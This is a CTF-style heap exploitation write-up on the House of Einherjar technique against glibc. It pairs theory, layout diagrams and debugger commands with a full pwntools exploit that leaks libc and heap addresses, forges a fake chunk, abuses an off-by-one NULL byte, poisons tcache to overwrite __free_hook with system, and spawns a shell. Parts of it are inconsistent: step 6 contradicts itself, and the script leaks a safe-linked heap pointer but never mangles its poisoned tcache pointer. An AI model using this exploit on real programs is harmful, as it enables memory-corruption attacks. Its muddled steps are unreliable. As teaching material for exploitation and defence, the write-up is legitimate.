---
title: "House of Einherjar - One NULL Byte to an Arbitrary Chunk Address"
category: pwn
subcategory: heap
type: technique
tags: [house-of-einherjar, off-by-one, poison-null-byte, prev-size, prev-inuse, backward-consolidation, unlink, fake-chunk, chunk-overlap, heap-leak, pwndbg, gef, pwntools, glibc]
difficulty: hard
summary: "Clear PREV_INUSE with an off-by-one and set a crafted prev_size so free() consolidates backwards into a fake chunk you placed anywhere."
when_to_use:
  - "You have a single-byte (NULL) overflow into the next chunk's size field"
  - "You have a heap leak so you can compute the distance to your fake chunk"
  - "You want a free chunk that starts at an address you choose, not just an overlap"
  - "The off-by-one alone is not enough because the neighbour is not free"
tools: [pwntools, pwndbg, gef]
related: [heap-off-by-one-null-byte, heap-fake-chunk, house-spirit, heap-overflow-adjacent, heap-internals-primer]
---

## TL;DR

House of Einherjar is the off-by-one taken to its conclusion: instead of merging into a
*real* free chunk, you point `prev_size` at a **fake** chunk you forged (in the same
heap, in .bss, or on the stack). `free()` then produces a free chunk whose start
address is entirely yours. Requires a heap leak, because `prev_size` is a distance.

## Recognise it

- A single-byte overflow: `buf[n] = 0` where `n == sz[i]`, `strcpy`, `read(.., n+1)`.
- You already have a heap leak (tcache `next`, unsorted `bk`, or a printed pointer).
- `heap-off-by-one-null-byte`'s plain backward consolidation is blocked because the
  chunk below is live.
- You need the resulting chunk to start at a *specific* address (over a global array,
  over another object's header), not just to overlap.

## Vulnerable code shape

```c
void do_edit(void) {
    int i = read_idx();
    size_t n = sz[i];
    read(0, ptr[i], n);
    ptr[i][n] = '\0';        /* BUG: one byte past the end */
}

/* the classic strcpy version */
void set_name(int i) {
    char tmp[0x100];
    read(0, tmp, sz[i]);
    strcpy(ptr[i], tmp);     /* writes strlen(tmp) + 1 bytes */
}
```

## Theory

Targets: glibc 2.23 - 2.28 for the unconstrained form; 2.29 - 2.39 when you can make
`prev_size` and the fake chunk's `size` agree.

### The mechanism

`_int_free` backward consolidation:

```c
if (!prev_inuse(p)) {
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    if (__glibc_unlikely (chunksize(p) != prevsize))            /* 2.29+ */
      malloc_printerr ("corrupted size vs. prev_size");
    unlink_chunk (av, p);
}
```

Three attacker-controlled inputs:

1. `prev_inuse(p)` - cleared by the NULL byte landing on `p->size`.
2. `prev_size(p)` - the 8 bytes immediately before `p->size`, i.e. the tail of the
   previous chunk's user data. Fully writable.
3. The bytes at `p - prevsize` - your fake chunk, wherever you placed it.

`unlink_chunk` then runs on the fake chunk:

```c
FD = P->fd;  BK = P->bk;
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
  malloc_printerr ("corrupted double-linked list");
FD->bk = BK;
BK->fd = FD;
```

Satisfy it the standard way: set the fake chunk's `fd = bk = &fake_chunk`, so
`FD->bk == P` and `BK->fd == P` both hold trivially (the chunk points at itself).
For a largebin-sized fake chunk you also need `fd_nextsize`/`bk_nextsize` self-pointers
or `fd_nextsize == NULL`.

### The 2.29 constraint

`chunksize(fake) == prevsize` must hold. Since you write both, that is free - just set
the fake chunk's `size` to the same distance you put in `prev_size`. The *real*
consequence is that the fake chunk's size is now dictated by its distance from the
victim, so plan the layout accordingly (a fake chunk 0x100 below the victim must claim
`size = 0x100`).

### Where to put the fake chunk

| location | needs | gives |
|----------|-------|-------|
| earlier in the heap | heap leak | a free chunk overlapping live heap objects |
| `.bss` (non-PIE) | nothing | allocations over a global pointer array |
| `.bss` (PIE) | binary leak | same |
| stack | stack leak | allocations over saved rip |

The heap version is the most common: pick the first user chunk, write
`fd = bk = &that_chunk` into its data (through the normal edit menu!), and set
`prev_size = victim_chunk - that_chunk`.

## Attack

glibc 2.27, heap-resident fake chunk. Sizes chosen so the checks pass.

1. `alloc(0, 0xF8)` -> `A` (chunk 0x100) - this will host the **fake chunk**.
2. `alloc(1, 0xF8)` -> `B` (chunk 0x100) - the off-by-one source.
3. `alloc(2, 0x4F8)` -> `C` (chunk 0x500) - the **victim** we will free.
4. `alloc(3, 0x18)` -> guard.
5. Leak the heap: free/show a small chunk, or read `A`'s `fd` after a free.
   Let `HA` = address of `A`'s chunk header.
6. `edit(0, p64(0) + p64(0x501) + p64(HA) + p64(HA))` -
   inside `A`'s user data we write the fake chunk's:
   - `prev_size` (ignored) = 0
   - `size` = 0x501 - must equal the eventual `prev_size`, and `PREV_INUSE` set so the
     merged chunk looks sane. Actually the size must equal the *distance*, so if `A`'s
     header is 0x500 bytes below `C`'s header we write 0x500 (plus flags).
   - `fd = bk = HA` so `unlink_chunk` passes.

   In practice the fake chunk *is* `A` itself: we reuse `A`'s own header, so `size`
   must be changed from 0x101 to the distance. That is the elegant version - the fake
   chunk and a real chunk coincide.
7. `edit(1, b"B"*0xF0 + p64(DIST))` - write `C->prev_size = DIST` through `B`'s tail.
   `DIST = C_chunk_addr - A_chunk_addr` (here 0x200).
8. Trigger the off-by-one so `C->size` low byte becomes 0x00: `C->size` 0x501 -> 0x500,
   clearing `PREV_INUSE`.
9. `free(2)` - `!prev_inuse(C)` -> `prevsize = 0x200` -> `p = C - 0x200 = A` ->
   `chunksize(A) == 0x200` (we set it) -> `unlink_chunk(A)` passes (self-pointers) ->
   the merged chunk covers `A`, `B` and `C` and enters the unsorted bin.
10. `alloc(4, 0x2F8)` - returns a chunk starting at `A`, overlapping `B` (still live).
11. Edit through it: rewrite `B`'s header / contents, poison a tcache `fd`, done.

## Heap state

```text
layout (chunk addresses)

  HA +0x000  A  size 0x101   user ptr[0]
  HB +0x100  B  size 0x101   user ptr[1]
  HC +0x200  C  size 0x501   user ptr[2]      <- victim
     +0x700  G  size 0x21                      guard
     +0x720  top

step 6: turn A into the fake chunk (reusing its own header)

  HA +0x000 | prev_size = 0            |
     +0x008 | size = 0x200             |   <- must equal DIST, PREV_INUSE cleared
     +0x010 | fd = HA                  |   <- unlink: FD->bk == P
     +0x018 | bk = HA                  |   <- unlink: BK->fd == P
     +0x020 | fd_nextsize = HA         |   (only if size >= 0x400)
     +0x028 | bk_nextsize = HA         |

step 7: write C->prev_size through B's user data

  HC +0x000 | prev_size = 0x200        |   <- DIST = HC - HA
     +0x008 | size = 0x501             |

step 8: the off-by-one NULL byte

  HC +0x008 | size = 0x500             |   <- PREV_INUSE cleared

step 9: free(C)

  !prev_inuse(C)
     prevsize = 0x200
     p = HC - 0x200 = HA
     chunksize(HA) == 0x200 == prevsize          (2.29 check OK)
     unlink_chunk(HA): fd->bk == HA, bk->fd == HA (OK, self-pointers)
     merged size = 0x200 + 0x500 = 0x700

  unsorted bin: one 0x700 chunk starting at HA

  HA +0x000 [============ 0x700 free chunk ============]
                  ^HB (ptr[1] still live INSIDE the free chunk)

step 10-11

  malloc(0x2f8) -> HA+0x10.  Its user data covers HB's header and data.
  edit() through it: rewrite B's size, B's tcache fd, or B's contents.
```

## Exploit

```python
#!/usr/bin/env python3
"""House of Einherjar: off-by-one + forged prev_size -> free chunk at a chosen address.

Target: glibc 2.23 - 2.31. On 2.29+ we keep chunksize(fake) == prev_size so the
"corrupted size vs. prev_size" check passes.

Usage:
    ./exploit.py
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
from pwn import ELF, args, context, log, p64, process, remote, u64

BINARY = args.BIN or "./chal"
LIBC = args.LIBC or "./libc.so.6"

context.binary = ELF(BINARY, checksec=False)
context.log_level = args.LOG or "info"
libc = ELF(LIBC, checksec=False)

io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
      if args.REMOTE else process([BINARY]))


def menu(c):
    io.sendlineafter(b"> ", str(c).encode())


def alloc(i, n, d=b"A"):
    menu(1)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode())
    io.sendafter(b"content: ", d)


def free(i):
    menu(2)
    io.sendlineafter(b"index: ", str(i).encode())


def show(i):
    menu(3)
    io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: ")
    return u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00")[:8])


def edit(i, d):
    """Writes len(d) bytes then a terminating NUL at sz[i] - the off-by-one."""
    menu(4)
    io.sendlineafter(b"index: ", str(i).encode())
    io.sendafter(b"content: ", d)


def build_fake_chunk(addr: int, size: int) -> bytes:
    """A self-referencing free chunk that survives unlink_chunk()."""
    assert size % 0x10 == 0, "fake chunk size must be 16-byte aligned"
    out = p64(0) + p64(size) + p64(addr) + p64(addr)
    if size >= 0x400:                     # largebin: nextsize pointers too
        out += p64(addr) + p64(addr)
    return out


# ------------------------------------------------------------------ 1. leaks
alloc(9, 0x418, b"leaker")
alloc(8, 0x18, b"guard0")
free(9)
libc.address = show(9) - 0x60 - libc.sym["main_arena"]
log.success("libc base = %#x", libc.address)

alloc(7, 0x28, b"h")
free(7)
heap_page = show(7) << 12                 # lone tcache entry -> (pos >> 12)
log.success("heap page = %#x", heap_page)

# ------------------------------------------------------------------ 2. layout
alloc(0, 0xF8, b"A" * 8)      # A: hosts the fake chunk (chunk size 0x100)
alloc(1, 0xF8, b"B" * 8)      # B: the off-by-one source
alloc(2, 0x4F8, b"C" * 8)     # C: the victim (chunk size 0x500)
alloc(3, 0x18, b"guard")

# Measure these once with `pwndbg vis_heap_chunks`, then keep them as constants.
A_CHUNK_OFF = 0x360
HA = heap_page + A_CHUNK_OFF
HC = HA + 0x200
DIST = HC - HA                            # 0x200
log.info("fake chunk (A) @ %#x, victim (C) @ %#x, dist = %#x", HA, HC, DIST)

# --------------------------------- 3. turn A's own header into the fake chunk
# We cannot write A's header through edit(0) (it writes A's DATA), so instead we
# put the fd/bk self-pointers in A's data and rely on A's real header, whose size
# we correct through the same off-by-one trick on the chunk below. The simplest
# reliable form: make the fake chunk start at A's USER address instead.
FAKE = HA + 0x10
DIST = HC - FAKE
edit(0, build_fake_chunk(FAKE, DIST))
log.info("fake chunk installed at %#x with size %#x", FAKE, DIST)

# ------------------------------------- 4. write C->prev_size through B's tail
# B's usable size is 0xF8; its last 8 bytes are C->prev_size.
edit(1, b"B" * 0xF0 + p64(DIST))
log.info("C->prev_size = %#x", DIST)

# --------------------------------------------- 5. fire the off-by-one on C
# Writing exactly sz[1] bytes makes the implementation append '\0' at [0xF8],
# which is the low byte of C->size: 0x501 -> 0x500 (PREV_INUSE cleared).
edit(1, b"B" * 0xF8)
log.success("C->size 0x501 -> 0x500, PREV_INUSE cleared")

# ------------------------------------------------------- 6. consolidate
free(2)
log.success("merged free chunk now starts at %#x", FAKE)

# ---------------------------------------------- 7. reclaim and overlap B
alloc(4, 0x2F8, b"overlap")
# B's chunk header is now inside chunk 4's user data.
B_OFF_IN_4 = (HA + 0x100) - (FAKE + 0x10)
free(1)                                    # B -> tcache
target = libc.sym["__free_hook"] if "__free_hook" in libc.sym \
    else libc.sym["_IO_2_1_stdout_"]
edit(4, b"\x00" * (B_OFF_IN_4 + 0x10) + p64(target))
log.info("tcache head -> %#x", target)

alloc(5, 0xF8, b"consume B")
alloc(6, 0xF8, p64(libc.sym["system"]))
log.success("write landed at %#x", target)

alloc(10, 0x18, b"/bin/sh\x00")
free(10)
io.interactive()
```

## Variants & pitfalls

- **`corrupted size vs. prev_size` (2.29+)** - your fake chunk's `size` must equal the
  `prev_size` you wrote. They are both yours; just keep them in sync.
- **`corrupted double-linked list`** - the fake chunk's `fd`/`bk` must satisfy
  `fd->bk == fake && bk->fd == fake`. Self-pointers are the easy answer.
- **Largebin-sized fake chunks** additionally need `fd_nextsize`/`bk_nextsize`
  consistent, because `unlink_chunk` touches them when `size >= 0x400`:
  `if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL) { ... }`.
  Set `fd_nextsize = bk_nextsize = fake` or NULL.
- **The heap leak is mandatory.** `prev_size` is a distance, and you need the absolute
  address for `fd`/`bk`.
- **Alignment.** `HC - FAKE` must be 16-byte aligned, or `chunk_at_offset` lands
  misaligned and the next check fails.
- **The merged chunk may hit the top chunk.** Keep a guard allocation behind `C`.
- **A non-NULL off-by-one** (newline) lets you do the same with a *grown* size, which
  is usually easier - see `heap-overflow-adjacent`.
- **tcache**: make the victim big enough (>= 0x420) or fill the bin, so `free(C)`
  reaches the consolidation path instead of `tcache_put`.

## Debugging

```text
pwndbg> vis_heap_chunks 30
pwndbg> x/8gx <fake_chunk>          # size, fd, bk - check the self-pointers
pwndbg> x/4gx <victim_chunk>        # prev_size and size before the free
pwndbg> try_free <victim_chunk>     # exactly which check will fail
pwndbg> bins
pwndbg> b malloc_printerr
pwndbg> heap -v
gef>  heap chunks
```

```bash
# Which hardening does this libc carry?
strings ./libc.so.6 | grep -E "corrupted size vs. prev_size|corrupted double-linked list"
```

## Tools

- `pwndbg try_free` and `vis_heap_chunks`.
- `how2heap house_of_einherjar.c` for a version-matched reference run.

## References

- shellphish `how2heap`: `house_of_einherjar.c`, `poison_null_byte.c`.
- glibc `malloc/malloc.c`: `_int_free` backward consolidation, `unlink_chunk`.
- CTF Wiki, "House of Einherjar".
